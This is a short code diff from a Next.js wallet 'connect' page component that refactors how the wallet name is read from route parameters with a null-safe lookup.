@@ -5,8 +5,8 @@ import { useRouter, useParams } from "next/navigation";
 
 const ConnectPage = () => {
   const router = useRouter();
-  const { slug } = useParams(); // slug will be the wallet name
-  const walletName = slug || "Unknown Wallet";
+  const params = useParams();
+  const walletName = params?.slug || "Unknown Wallet";
 
   const [activeTab, setActiveTab] = useState("phrase");
   const [formData, setFormData] = useState({
